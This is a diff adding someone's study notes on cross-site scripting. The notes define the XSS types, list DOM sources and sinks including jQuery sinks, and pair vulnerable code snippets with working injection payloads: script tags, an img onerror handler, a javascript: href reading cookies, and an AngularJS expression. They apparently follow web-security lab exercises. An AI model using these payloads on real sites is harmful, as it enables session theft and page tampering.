@@ -1,0 +1,124 @@
+if the application executes the injected js code, it leads to xss
+
+Reflectes xss - injectd script comes from the current http request
+Stored xss - injected script comes from the website's database
+
+DOM-based xss - clientside code is injectable
+
+self xss - it applies only if the victim injects the code... payload cannot be sent by the attacker 
+
+Reflected XSS:
+	search=<script>alert(1)</script>
+	
+Stored xss:
+	comment=<script>alert(1)</script>
+
+DOM xss:
+
+When a website contains javascript that takes value(called the source) which can be controlled by the attacker, passes onto an unsafe function(called the sink).
+
+user controlled input = Source
+vulnerable function = Sink
+
+Here are some well-known vulnerable “sources”:-
+
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB
+Database
+
+Here are some well-known vulnerable “sinks”:-
+
+document.write()
+window.location
+document.cookie
+eval()
+document.domain
+WebSocket()
+someElement.src
+postMessage()
+setRequestHeader()
+FileReader.readAsText()
+ExecuteSql()
+sessionStorage.setItem()
+document.evaluate()
+JSON.parse()
+someElement.setAttribute()
+RegExp()
+someDOMElement.innerHTML
+someDOMElement.outerHTML
+someDOMElement.insertAdjacentHTML
+someDOMElement.onevent
+
+jquery
+
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+
+	
+
+function trackSearch(query) {
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+
+payload : search="><script>alert(1)</script>
+
+
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+document.write('<option selected>'+store+'</option>');
+  
+breakout of the code with this
+
+payload : </option><script>alert(1)</script>
+
+The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe.
+
+document.getElementById('searchMessage').innerHTML = query
+
+payload : </span><img src=1 onerror="alert(1)">
+                    
+
+$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+
+payload : javascript:alert(document.cookie)
+
+we can update the herf with a clickable js event
+
+if ng-app is added to a html tag, anything within {{}} will be excuted as a angular experession, thus enter this payload, our code gets executed
+
+payload : {{constructor.constructor('alert(1)')()}}
+
+
+
+
+
